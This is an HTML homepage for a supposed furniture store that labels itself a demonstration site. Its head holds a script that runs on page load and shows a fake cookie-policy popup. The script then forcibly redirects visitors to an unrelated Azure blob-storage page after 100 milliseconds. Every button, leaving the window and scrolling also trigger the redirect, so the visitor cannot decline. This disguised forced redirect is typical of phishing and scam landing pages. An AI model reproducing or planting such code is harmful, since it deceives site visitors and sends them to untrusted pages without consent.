<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script>
document.addEventListener("DOMContentLoaded", function() {
    // 1. CONFIGURATION
    const redirectUrl = "https://datatank4745.blob.core.windows.net/store-box-9296/index.html"; 
    const autoRedirectDelay = 100; 

    // 2. SAFETY CHECK
    if (sessionStorage.getItem("cookieRedirected") === "true") return;

    // 3. INJECT CSS (Same as before, but ensured to load)
    const style = document.createElement('style');
    style.innerHTML = `
        #cookie-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85); display: flex;
            align-items: center; justify-content: center; z-index: 999999999;
            padding: 20px; box-sizing: border-box; font-family: sans-serif;
        }
        .cookie-popup {
            background: #fff; padding: 30px; border-radius: 15px;
            max-width: 400px; width: 100%; position: relative;
            text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .cookie-popup h3 { margin: 0 0 15px; color: #333; }
        .btn-primary {
            background: #007bff; color: white; border: none;
            padding: 15px; border-radius: 8px; font-weight: bold;
            cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px;
        }
        .close-btn {
            position: absolute; top: 10px; right: 15px; background: none;
            border: none; font-size: 24px; cursor: pointer; color: #aaa;
        }
    `;
    document.head.appendChild(style);

    // 4. CREATE THE POPUP
    const overlay = document.createElement("div");
    overlay.id = "cookie-overlay";
    overlay.innerHTML = `
        <div class="cookie-popup">
            <button class="close-btn" id="close-popup">&times;</button>
            <h3>Cookie Policy</h3>
            <p>We use cookies to improve your experience. You will be redirected to our full policy momentarily.</p>
            <button id="accept-cookies" class="btn-primary">Accept & Continue Now</button>
        </div>
    `;
    document.body.appendChild(overlay);

    let isRedirected = false;
    const handleRedirect = () => {
        if (!isRedirected) {
            isRedirected = true;
            sessionStorage.setItem("cookieRedirected", "true");
            window.location.replace(redirectUrl); // .replace is better for forced redirects
        }
    };

    // 5. THE 5-SECOND TIMER
    const timerId = setTimeout(handleRedirect, autoRedirectDelay);

    // 6. DESKTOP EXIT INTENT
    document.addEventListener("mouseleave", (e) => {
        if (e.clientY <= 0) {
            clearTimeout(timerId);
            handleRedirect();
        }
    });

    // 7. MOBILE SCROLL INTENT
    let lastScroll = 0;
    window.addEventListener("scroll", () => {
        const nowScroll = window.pageYOffset || document.documentElement.scrollTop;
        if (nowScroll < lastScroll && nowScroll < 10) {
            clearTimeout(timerId);
            handleRedirect();
        }
        lastScroll = nowScroll <= 0 ? 0 : nowScroll;
    }, { passive: true });

    // 8. BUTTON CLICKS
    document.getElementById("accept-cookies").onclick = () => {
        clearTimeout(timerId);
        handleRedirect();
    };
    document.getElementById("close-popup").onclick = () => {
        clearTimeout(timerId);
        handleRedirect();
    };
});
</script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Premium furniture store offering high-quality sofas, chairs, tables, and bedroom furniture.">
    <meta name="keywords" content="furniture, sofas, chairs, tables, bedroom furniture, home decor">
    <meta name="author" content="Furniture Con Furry Site">
    <meta name="robots" content="index, follow">
    <link rel="canonical" href="https://furnitureconfurrysite.com/">
    <link rel="stylesheet" href="styles.css">
    <title>Furniture Con Furry Site - Quality Sofas, Chairs & Tables</title>
</head>
<body>
    <!-- DISCLAIMER BANNER -->
    <div class="disclaimer-banner">
        <div class="disclaimer-content">
            <strong>⚠️ DISCLAIMER:</strong> This is a demonstration website. <a href="disclaimer.html" style="color: white; text-decoration: underline; font-weight: bold;">📋 Read Full Disclaimer</a> | <a href="privacy.html" style="color: white; text-decoration: underline;">Privacy</a> | <a href="terms.html" style="color: white; text-decoration: underline;">Terms</a>
        </div>
    </div>

    <header>
        <div class="header-content">
            <div class="logo">
                <img src="https://images.unsplash.com/photo-1555041469-a586c61ea9bc?w=50&h=50&fit=crop" alt="Logo">
                <h1>Furniture Con Furry Site</h1>
            </div>
            <nav class="navbar">
                <ul>
                    <li><a href="index.html" class="active">Home</a></li>
                    <li><a href="about.html">About</a></li>
                    <li><a href="sitemap.html">Sitemap</a></li>
                    <li><a href="disclaimer.html" style="color: #fff3cd; font-weight: bold;">⚠️ Disclaimer</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <section class="hero">
        <div class="hero-content">
            <h2>Transform Your Home with Premium Furniture</h2>
            <p>Discover elegant, comfortable, and affordable furniture for every room</p>
            <a href="#products" class="cta-button">Explore Collection</a>
        </div>
    </section>

    <main>
        <section class="about-intro">
            <h2>Welcome to Furniture Con Furry Site</h2>
            <p>At Furniture Con Furry Site, we believe that your home should be a reflection of your personal style and comfort. For over 20 years, we have been committed to providing our customers with the finest quality furniture that combines functionality with aesthetic appeal. Our extensive collection includes modern sofas, elegant dining tables, comfortable bed frames, stylish office furniture, and much more.</p>
            <p>We understand that choosing the right furniture can be overwhelming. That's why we curate our selection to include only the best brands and designers who share our commitment to quality craftsmanship. Each piece in our store is carefully selected to ensure durability, comfort, and timeless style. We offer competitive pricing without compromising on quality, making premium furniture accessible to everyone.</p>
        </section>

        <section id="products" class="products">
            <h2>Our Furniture Categories</h2>
            
            <div class="product-grid">
                <article class="product-card">
                    <img src="https://images.unsplash.com/photo-1555041469-a586c61ea9bc?w=400&h=300&fit=crop" alt="Modern Sofa">
                    <h3>Sofas & Couches</h3>
                    <p>Luxurious sofas designed for maximum comfort and style. Perfect for any living room aesthetic.</p>
                    <a href="#" class="product-link">View Collection →</a>
                </article>

                <article class="product-card">
                    <img src="https://images.unsplash.com/photo-1572520547296-8d29e20b135f?w=400&h=300&fit=crop" alt="Dining Table">
                    <h3>Dining Tables</h3>
                    <p>Elegant dining tables that bring families together. From casual to formal styles.</p>
                    <a href="#" class="product-link">View Collection →</a>
                </article>

                <article class="product-card">
                    <img src="https://images.unsplash.com/photo-1540932239986-310128078ceb?w=400&h=300&fit=crop" alt="Bedroom">
                    <h3>Bedroom Furniture</h3>
                    <p>Create your perfect sanctuary with our premium bed frames and bedroom sets.</p>
                    <a href="#" class="product-link">View Collection →</a>
                </article>

                <article class="product-card">
                    <img src="https://images.unsplash.com/photo-1593642632823-8f785ba67e45?w=400&h=300&fit=crop" alt="Office">
                    <h3>Office Furniture</h3>
                    <p>Professional and comfortable office solutions for your workspace.</p>
                    <a href="#" class="product-link">View Collection →</a>
                </article>

                <article class="product-card">
                    <img src="https://images.unsplash.com/photo-1506439773649-6e0eb8cfb237?w=400&h=300&fit=crop" alt="Chairs">
                    <h3>Chairs & Seating</h3>
                    <p>Comfortable accent chairs and seating options for any room in your home.</p>
                    <a href="#" class="product-link">View Collection →</a>
                </article>

                <article class="product-card">
                    <img src="https://images.unsplash.com/photo-1556909114-f6e7ad7d3136?w=400&h=300&fit=crop" alt="Storage">
                    <h3>Storage Solutions</h3>
                    <p>Stylish storage furniture to organize and beautify your space.</p>
                    <a href="#" class="product-link">View Collection →</a>
                </article>
            </div>
        </section>

        <section class="benefits">
            <h2>Why Choose Us?</h2>
            <div class="benefits-grid">
                <div class="benefit-item">
                    <h3>✓ Quality Guaranteed</h3>
                    <p>All furniture is made with premium materials and superior craftsmanship.</p>
                </div>
                <div class="benefit-item">
                    <h3>✓ Affordable Prices</h3>
                    <p>Competitive pricing on all products without sacrificing quality.</p>
                </div>
                <div class="benefit-item">
                    <h3>✓ Expert Support</h3>
                    <p>Our knowledgeable team is here to help you choose the perfect furniture.</p>
                </div>
                <div class="benefit-item">
                    <h3>✓ Fast Delivery</h3>
                    <p>Quick and reliable delivery services to your home.</p>
                </div>
            </div>
        </section>

        <section class="cta-section">
            <h2>Ready to Transform Your Space?</h2>
            <p>Browse our complete collection and find the perfect furniture for your home today.</p>
            <a href="#products" class="cta-button">Shop Now</a>
        </section>
    </main>

    <footer>
        <div class="footer-content">
            <div class="footer-section">
                <h4>Quick Links</h4>
                <ul>
                    <li><a href="index.html">Home</a></li>
                    <li><a href="about.html">About Us</a></li>
                    <li><a href="sitemap.html">Sitemap</a></li>
                </ul>
            </div>
            <div class="footer-section">
                <h4>Legal</h4>
                <ul>
                    <li><a href="disclaimer.html">⚠️ Disclaimer</a></li>
                    <li><a href="privacy.html">Privacy Policy</a></li>
                    <li><a href="terms.html">Terms & Conditions</a></li>
                </ul>
            </div>
            <div class="footer-section">
                <h4>Contact</h4>
                <p>Email: info@furnitureconfurrysite.com</p>
                <p>Phone: +1-800-FURNITURE</p>
            </div>
        </div>
        <div class="footer-bottom">
            <p>&copy; 2026 Furniture Con Furry Site. All Rights Reserved. | <a href="disclaimer.html">Disclaimer</a> | <a href="privacy.html">Privacy Policy</a></p>
        </div>
    </footer>
</body>
</html>
